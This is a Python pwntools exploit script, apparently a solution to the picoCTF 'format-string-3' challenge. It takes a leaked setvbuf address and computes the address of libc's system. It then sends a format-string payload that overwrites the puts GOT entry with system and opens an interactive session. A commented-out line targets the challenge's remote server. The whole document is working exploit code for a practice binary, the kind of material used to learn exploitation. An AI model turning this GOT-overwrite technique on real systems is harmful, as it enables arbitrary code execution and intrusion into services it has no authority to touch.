import sys
from pwn import *
from pwnlib.elf.elf import *
from pwnlib.fmtstr import *

context.arch='amd64'

fs3 = ELF('./format-string-3')
got_puts = fs3.got['puts']
print(f'got_puts: {hex(got_puts)}')
libc = ELF('./libc.so.6')
libc_system = libc.symbols['system']
print(f'libc_system: {hex(libc_system)}')
libc_setvbuf = libc.symbols['setvbuf']
print(f'libc_setvbuf: {hex(libc_setvbuf)}')

#host = sys.argv[1]
#port = int(sys.argv[2])
r = process("./format-string-3")
# r = remote("rhea.picoctf.net", port=53952)

"""
m = r.recvregex(b'libc: 0x([0-9a-f]+)\n')
matched_string = m.group(0).decode()
log.info(f'matched_string: {matched_string}')
loaded_libc_setvbuf = int(m.group(1).decode(), 16)
"""
r.recvuntil(b"Okay I'll be nice. Here's the address of setvbuf in libc: ")
res = r.recvline()
loaded_libc_setvbuf = int(res[:-1].decode(), base=16)

loaded_libc_system = loaded_libc_setvbuf + (libc_system - libc_setvbuf)
log.info(f'loaded_libc_system: {hex(loaded_libc_system)}')
loaded_libc_system_lower = loaded_libc_system & 0xffffffff
format_string = fmtstr_payload(38, {got_puts:loaded_libc_system}, numbwritten=0, write_size='byte')
r.sendline(format_string)
r.interactive()
